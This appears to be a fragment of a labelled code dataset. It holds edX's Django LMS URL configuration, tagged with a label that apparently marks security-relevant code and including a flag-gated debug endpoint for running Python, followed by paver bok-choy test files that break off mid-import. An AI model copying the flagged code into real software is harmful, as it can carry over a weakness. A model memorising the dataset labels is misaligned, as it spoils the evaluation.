"5fad9ccca43cdfb565b3f80914f998afa7f2fa78", "code": "/lms/urls.py/n/nfrom django.conf import settings\nfrom django.conf.urls import patterns, include, url\nfrom django.contrib import admin\nfrom django.conf.urls.static import static\n\n# Not used, the work is done in the imported module.\nfrom . import one_time_startup      # pylint: disable=W0611\n\nimport django.contrib.auth.views\n\n# Uncomment the next two lines to enable the admin:\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    admin.autodiscover()\n\nurlpatterns = ('',  # nopep8\n    # certificate view\n\n    url(r'^update_certificate$', 'certificates.views.update_certificate'),\n    url(r'^$', 'branding.views.index', name=\"root\"),   # Main marketing page, or redirect to courseware\n    url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),\n    url(r'^login$', 'student.views.signin_user', name=\"signin_user\"),\n    url(r'^register$', 'student.views.register_user', name=\"register_user\"),\n\n    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),\n\n    url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"),\n    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),\n    url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"),\n    url(r'^accept_name_change$', 'student.views.accept_name_change'),\n    url(r'^reject_name_change$', 'student.views.reject_name_change'),\n    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),\n    url(r'^event$', 'track.views.user_track'),\n    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?\n\n    url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"),\n\n    url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),\n    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),\n    url(r'^logout$', 'student.views.logout_user', name='logout'),\n    url(r'^create_account$', 'student.views.create_account', name='create_account'),\n    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"),\n\n    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"),\n    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),\n\n    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),\n    ## Obsolete Django views for password resets\n    ## TODO: Replace with Mako-ized views\n    url(r'^password_change/$', django.contrib.auth.views.password_change,\n        name='auth_password_change'),\n    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,\n        name='auth_password_change_done'),\n    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',\n        'student.views.password_reset_confirm_wrapper',\n        name='auth_password_reset_confirm'),\n    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,\n        name='auth_password_reset_complete'),\n    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,\n        name='auth_password_reset_done'),\n\n    url(r'^heartbeat$', include('heartbeat.urls')),\n)\n\n# University profiles only make sense in the default edX context\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        ##\n        ## Only universities without courses should be included here.  If\n        ## courses exist, the dynamic profile rule below should win.\n        ##\n        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}),\n        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}),\n        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}),\n        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}),\n        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}),\n        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}),\n\n        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',\n            name=\"university_profile\"),\n    )\n\n#Semi-static views (these need to be rendered and have the login bar, but don't change)\nurlpatterns += (\n    url(r'^404$', 'static_template_view.views.render',\n        {'template': '404.html'}, name=\"404\"),\n)\n\n# Semi-static views only used by edX, not by themes\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        url(r'^jobs$', 'static_template_view.views.render',\n            {'template': 'jobs.html'}, name=\"jobs\"),\n        url(r'^press$', 'student.views.press', name=\"press\"),\n        url(r'^media-kit$', 'static_template_view.views.render',\n            {'template': 'media-kit.html'}, name=\"media-kit\"),\n        url(r'^faq$', 'static_template_view.views.render',\n            {'template': 'faq.html'}, name=\"faq_edx\"),\n        url(r'^help$', 'static_template_view.views.render',\n            {'template': 'help.html'}, name=\"help_edx\"),\n\n        # TODO: (bridger) The copyright has been removed until it is updated for edX\n        # url(r'^copyright$', 'static_template_view.views.render',\n        #     {'template': 'copyright.html'}, name=\"copyright\"),\n\n        #Press releases\n        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),\n\n        # Favicon\n        (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),\n\n        url(r'^submit_feedback$', 'util.views.submit_feedback'),\n\n    )\n\n# Only enable URLs for those marketing links actually enabled in the\n# settings. Disable URLs by marking them as None.\nfor key, value in settings.MKTG_URL_LINK_MAP.items():\n    # Skip disabled URLs\n    if value is None:\n        continue\n\n    # These urls are enabled separately\n    if key == \"ROOT\" or key == \"COURSES\" or key == \"FAQ\":\n        continue\n\n    # Make the assumptions that the templates are all in the same dir\n    # and that they all match the name of the key (plus extension)\n    template = \"%s.html\" % key.lower()\n\n    # To allow theme templates to inherit from default templates,\n    # prepend a standard prefix\n    if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n        template = \"theme-\" + template\n\n    # Make the assumption that the URL we want is the lowercased\n    # version of the map key\n    urlpatterns += (url(r'^%s' % key.lower(),\n                        'static_template_view.views.render',\n                        {'template': template}, name=value),)\n\n\nif settings.PERFSTATS:\n    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)\n\n# Multicourse wiki (Note: wiki urls must be above the courseware ones because of\n# the custom tab catch-all)\nif settings.WIKI_ENABLED:\n    from wiki.urls import get_pattern as wiki_pattern\n    from django_notify.urls import get_pattern as notify_pattern\n\n    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update\n    # them together.\n    urlpatterns += (\n        # First we include views from course_wiki that we use to override the default views.\n        # They come first in the urlpatterns so they get resolved first\n        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),\n        url(r'^wiki/', include(wiki_pattern())),\n        url(r'^notify/', include(notify_pattern())),\n\n        # These urls are for viewing the wiki in the context of a course. They should\n        # never be returned by a reverse() so they come after the other url patterns\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',\n            'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),\n        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),\n    )\n\n\nif settings.COURSEWARE_ENABLED:\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',\n            'courseware.views.jump_to', name=\"jump_to\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.modx_dispatch',\n            name='modx_dispatch'),\n\n\n        # Software Licenses\n\n        # TODO: for now, this is the endpoint of an ajax replay\n        # service that retrieve and assigns license numbers for\n        # software assigned to a course. The numbers have to be loaded\n        # into the database.\n        url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.xqueue_callback',\n            name='xqueue_callback'),\n        url(r'^change_setting$', 'student.views.change_setting',\n            name='change_setting'),\n\n        # TODO: These views need to be updated before they work\n        url(r'^calculate$', 'util.views.calculate'),\n        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki\n        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),\n        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),\n\n        url(r'^courses/?$', 'branding.views.courses', name=\"courses\"),\n        url(r'^change_enrollment$',\n            'student.views.change_enrollment', name=\"change_enrollment\"),\n\n        #About the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',\n            'courseware.views.course_about', name=\"about_course\"),\n        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n        #View for mktg site\n        url(r'^mktg/(?P<course_id>.*)$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n\n\n\n        #Inside the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'courseware.views.course_info', name=\"course_root\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',\n            'courseware.views.course_info', name=\"info\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n            'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n            'staticbook.views.index', name=\"book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n            'courseware.views.index', name=\"courseware\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_chapter\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_section\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',\n            'courseware.views.index', name=\"courseware_position\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',\n            'courseware.views.progress', name=\"progress\"),\n        # Takes optional student_id for instructor use--shows profile as that student sees it.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',\n            'courseware.views.progress', name=\"student_progress\"),\n\n        # For the instructor\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',\n            'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',\n            'instructor.views.gradebook', name='gradebook'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',\n            'instructor.views.grade_summary', name='grade_summary'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',\n            'open_ended_grading.views.staff_grading', name='staff_grading'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',\n            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',\n            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),\n\n        # Open Ended problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',\n            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),\n\n        # Open Ended flagged problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',\n            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',\n            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),\n\n        # Cohorts management\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',\n            'course_groups.views.list_cohorts', name=\"cohorts\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',\n            'course_groups.views.add_cohort',\n            name=\"add_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',\n            'course_groups.views.users_in_cohort',\n            name=\"list_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',\n            'course_groups.views.add_users_to_cohort',\n            name=\"add_to_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',\n            'course_groups.views.remove_user_from_cohort',\n            name=\"remove_from_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',\n            'course_groups.views.debug_cohort_mgmt',\n            name=\"debug_cohort_mgmt\"),\n\n        # Open Ended Notifications\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',\n            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',\n            'open_ended_grading.views.peer_grading', name='peer_grading'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),\n\n    )\n\n    # allow course staff to change to student view of courseware\n    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):\n        urlpatterns += (\n            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"),\n        )\n\n    # discussion forums live within courseware, so courseware must be enabled first\n    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',\n                'courseware.views.news', name=\"news\"),\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',\n                include('django_comment_client.urls'))\n        )\n    urlpatterns += (\n        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',\n        'courseware.views.static_tab', name=\"static_tab\"),\n    )\n\n    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',\n                'courseware.views.submission_history',\n                name='submission_history'),\n        )\n\n\nif settings.ENABLE_JASMINE:\n    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)\n\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    ## Jasmine and admin\n    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID'):\n    urlpatterns += (\n        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),\n        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),\n        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),\n    )\n\nif settings.MITX_FEATURES.get('AUTH_USE_SHIB'):\n    urlpatterns += (\n        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),\n    )\n\nif settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):\n    urlpatterns += (\n        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_login', name='course-specific-login'),\n        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_register', name='course-specific-register'),\n\n    )\n\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):\n    urlpatterns += (\n        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),\n        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),\n        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),\n        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):\n    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),\n\nif settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):\n    urlpatterns += (\n        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),\n        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):\n    urlpatterns += (\n        url(r'^event_logs$', 'track.views.view_tracking_log'),\n        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):\n    urlpatterns += (\n        url(r'^status/', include('service_status.urls')),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):\n    urlpatterns += (\n        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),\n    )\n\nif settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):\n    urlpatterns += (\n        url(r'^edinsights_service/', include('edinsights.core.urls')),\n    )\n    import edinsights.core.registry\n\n# FoldIt views\nurlpatterns += (\n    # The path is hardcoded into their app...\n    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"),\n)\n\nif settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):\n    urlpatterns += (\n        url(r'^debug/run_python', 'debug.views.run_python'),\n    )\n\n# Crowdsourced hinting instructor manager.\nif settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',\n            'instructor.hint_manager.hint_manager', name=\"hint_manager\"),\n    )\n\nurlpatterns = patterns(*urlpatterns)\n\nif settings.DEBUG:\n    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)\n\n#Custom error pages\nhandler404 = 'static_template_view.views.render_404'\nhandler500 = 'static_template_view.views.render_500'\n/n/n/n", "label": 1}, {"id": "1162dbc18fda91b07a5942873387d60fd67b2cfc", "code": "pavelib/paver_tests/test_paver_bok_choy_cmds.py/n/n\"\"\"\nTests for the bok-choy paver commands themselves.\nRun just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py\n\"\"\"\nimport os\nimport unittest\n\nfrom mock import patch, call\nfrom test.test_support import EnvironmentVarGuard\nfrom paver.easy import BuildFailure\nfrom pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler\n\nREPO_DIR = os.getcwd()\n\n\nclass TestPaverBokChoyCmd(unittest.TestCase):\n    \"\"\"\n    Paver Bok Choy Command test cases\n    \"\"\"\n\n    def _expected_command(self, name, store=None, verify_xss=True):\n        \"\"\"\n        Returns the command that is expected to be run for the given test spec\n        and store.\n        \"\"\"\n\n        expected_statement = (\n            \"DEFAULT_STORE={default_store} \"\n            \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \"\n            \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \"\n            \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \"\n            \"SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' \"\n            \"VERIFY_XSS='{verify_xss}' \"\n            \"nosetests {repo_dir}/common/test/acceptance/{exp_text} \"\n            \"--with-xunit \"\n            \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \"\n            \"--verbosity=2 \"\n        ).format(\n            default_store=store,\n            repo_dir=REPO_DIR,\n            shard_str='/shard_' + self.shard if self.shard else '',\n            exp_text=name,\n            a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js',\n            verify_xss=verify_xss\n        )\n        return expected_statement\n\n    def setUp(self):\n        super(TestPaverBokChoyCmd, self).setUp()\n        self.shard = os.environ.get('SHARD')\n        self.env_var_override = EnvironmentVarGuard()\n\n    def test_default(self):\n        suite = BokChoyTestSuite('')\n        name = 'tests'\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_suite_spec(self):\n        spec = 'test_foo.py'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_class_spec(self):\n        spec = 'test_foo.py:FooTest'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_testcase_spec(self):\n        spec = 'test_foo.py:FooTest.test_bar'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_spec_with_draft_default_store(self):\n        spec = 'test_foo.py'\n        suite = BokChoyTestSuite('', test_spec=spec, default_store='draft')\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=name, store='draft')\n        )\n\n    def test_invalid_default_store(self):\n        # the cmd will dumbly compose whatever we pass in for the default_store\n        suite = BokChoyTestSuite('', default_store='invalid')\n        name = 'tests'\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=name, store='invalid')\n        )\n\n    def test_serversonly(self):\n        suite = BokChoyTestSuite('', serversonly=True)\n        self.assertEqual(suite.cmd, \"\")\n\n    def test_verify_xss(self):\n        suite = BokChoyTestSuite('', verify_xss=True)\n        name = 'tests'\n        self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n\n    def test_verify_xss_env_var(self):\n        self.env_var_override.set('VERIFY_XSS', 'False')\n        with self.env_var_override:\n            suite = BokChoyTestSuite('')\n            name = 'tests'\n            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=False))\n\n    def test_test_dir(self):\n        test_dir = 'foo'\n        suite = BokChoyTestSuite('', test_dir=test_dir)\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=test_dir)\n        )\n\n    def test_verbosity_settings_1_process(self):\n        \"\"\"\n        Using 1 process means paver should ask for the traditional xunit plugin for plugin results\n        \"\"\"\n        expected_verbosity_string = (\n            \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else ''\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=1)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_verbosity_settings_2_processes(self):\n        \"\"\"\n        Using multiple processes means specific xunit, coloring, and process-related settings should\n        be used.\n        \"\"\"\n        process_count = 2\n        expected_verbosity_string = (\n            \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\"\n            \" --processes={procs} --no-color --process-timeout=1200\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else '',\n                procs=process_count\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=process_count)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_verbosity_settings_3_processes(self):\n        \"\"\"\n        With the above test, validate that num_processes can be set to various values\n        \"\"\"\n        process_count = 3\n        expected_verbosity_string = (\n            \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\"\n            \" --processes={procs} --no-color --process-timeout=1200\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else '',\n                procs=process_count\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=process_count)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_invalid_verbosity_and_processes(self):\n        \"\"\"\n        If an invalid combination of verbosity and number of processors is passed in, a\n        BuildFailure should be raised\n        \"\"\"\n        suite = BokChoyTestSuite('', num_processes=2, verbosity=3)\n        with self.assertRaises(BuildFailure):\n            BokChoyTestSuite.verbosity_processes_string(suite)\n\n\nclass TestPaverPa11yCrawlerCmd(unittest.TestCase):\n\n    \"\"\"\n    Paver pa11ycrawler command test cases.  Most of the functionality is\n    inherited from BokChoyTestSuite, so those tests aren't duplicated.\n    \"\"\"\n\n    def setUp(self):\n        super(TestPaverPa11yCrawlerCmd, self).setUp()\n\n        # Mock shell commands\n        mock_sh = patch('pavelib.utils.test.suites.bokchoy_suite.sh')\n        self._mock_sh = mock_sh.start()\n\n        # Cleanup mocks\n        self.addCleanup(mock_sh.stop)\n\n    def _expected_command(self, report_dir, start_urls):\n        \"\"\"\n        Returns the expected command to run pa11ycrawler.\n        \"\"\"\n        expected_statement = (\n            'pa11ycrawler run {start_urls} '\n            '--pa11ycrawler-allowed-domains=localhost '\n            '--pa11ycrawler-reports-dir={report_dir} '\n            '--pa11ycrawler-deny-url-matcher=logout '\n            '--pa11y-reporter=\"1.0-json\" '\n            '--depth-limit=6 '\n        ).format(\n            start_urls=' '.join(start_urls),\n            report_dir=report_dir,\n        )\n        return expected_statement\n\n    def test_default(self):\n        suite = Pa11yCrawler('')\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(suite.pa11y_report_dir, suite.start_urls)\n        )\n\n    def test_get_test_course(self):\n        suite = Pa11yCrawler('')\n        suite.get_test_course()\n        self._mock_sh.assert_has_calls([\n            call(\n                'wget {targz} -O {dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)),\n            call(\n                'tar zxf {dir}demo_course.tar.gz -C {dir}'.format(dir=suite.imports_dir)),\n        ])\n\n    def test_generate_html_reports(self):\n        suite = Pa11yCrawler('')\n        suite.generate_html_reports()\n        self._mock_sh.assert_has_calls([\n            call(\n                'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite.pa11y_report_dir)),\n        ])\n/n/n/npavelib/utils/test/suites/bokchoy_suite.py/n/n\"\"\"\nClass used for defining and running Bok Choy acceptance test suite\n\"\"\"\nfrom time import sleep\nfrom urllib import urlencode\n\nfrom common.test.acceptance.fixtures.course import CourseFixture, FixtureError\n\nfrom path import Path as path\nfrom paver.easy import sh, BuildFailure\nfrom pavelib.utils.test.suites.suite import TestSuite\nfrom pavelib.utils.envs import Env\nfrom pavelib.utils.test import 